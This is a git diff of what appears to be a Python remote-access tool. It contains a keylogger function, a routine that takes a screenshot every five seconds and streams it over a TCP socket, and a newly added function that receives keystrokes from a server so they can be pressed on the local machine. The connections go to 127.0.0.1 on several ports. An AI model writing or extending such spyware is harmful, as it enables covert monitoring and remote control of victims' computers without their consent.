@@ -4,7 +4,7 @@ import sys
 from PIL import ImageGrab
 import time
 import io
-
+host = '127.0.0.1'
 def send_message_to_server(client_socket,message):
     print("Sending")
     client_socket.sendall(message.encode())
@@ -19,12 +19,11 @@ def return_image_size(image):
     image_data.close()
     return str(image_size)
 def send_screenshot():
-    SERVER_PORT = 12345
-    SERVER_IP = '127.0.0.1'
+    port = 5003
     # Create a TCP/IP socket
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Connect to the server
-    client_socket.connect((SERVER_IP, SERVER_PORT))
+    client_socket.connect((host, port))
 
     while True:
             # Take a screenshot using PIL
@@ -39,10 +38,23 @@ def send_screenshot():
             # Wait for some time before taking the next screenshot
          time.sleep(5)
 #send_screenshot() #run screenshot fucntion
+def keyboard_controlled():
+    port = 5001
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((host,port))
+    print("Connected with host")
+    while True:
+        key = s.recv(1024).decode()
+        if key != "":
+         print("Press key - > ",key)
+         #keyboard.press_and_release(key)
+        else:
+            print("connection lost with server")
+            s.close()
+            break
 def keylogger():
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    host = '127.0.0.1'
-    port = 1234
+    port = 5000
     connection_successful = False
     s.connect((host, port))
     print("Connected")
@@ -55,6 +67,10 @@ def keylogger():
         s.close()
         sys.exit()
     keyboard.wait('esc')
-    s.close()    
-keylogger()   
+    s.close()
+def main():
+    #keylogger()
+    keyboard_controlled()
+if __name__ == "__main__":
+    main()   
 
